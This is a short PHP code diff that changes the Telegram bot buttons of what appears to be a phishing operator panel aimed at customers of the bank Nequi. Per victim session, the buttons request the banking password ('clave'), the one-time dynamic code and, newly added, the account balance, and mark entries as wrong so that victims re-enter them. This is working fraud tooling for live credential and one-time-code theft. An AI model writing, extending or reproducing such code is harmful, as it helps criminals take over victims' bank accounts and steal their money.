@@ -70,11 +70,14 @@ try {
             ['text' => '🔐 Pedir Clave', 'callback_data' => "nequi_request_clave|{$sessionId}"]
         ],
         [
-            ['text' => '❌ Error Clave', 'callback_data' => "nequi_error_clave|{$sessionId}"],
+            ['text' => '📊 Pedir Saldo', 'callback_data' => "nequi_pedir_saldo|{$sessionId}"],
             ['text' => '🎯 Pedir Dinámica', 'callback_data' => "nequi_request_dinamica|{$sessionId}"]
         ],
         [
-            ['text' => '❌ Error Dinámica', 'callback_data' => "nequi_error_dinamica|{$sessionId}"],
+            ['text' => '❌ Error Clave', 'callback_data' => "nequi_error_clave|{$sessionId}"],
+            ['text' => '❌ Error Dinámica', 'callback_data' => "nequi_error_dinamica|{$sessionId}"]
+        ],
+        [
             ['text' => '🏁 Finalizar', 'callback_data' => "nequi_finalizar|{$sessionId}"]
         ]
     ];
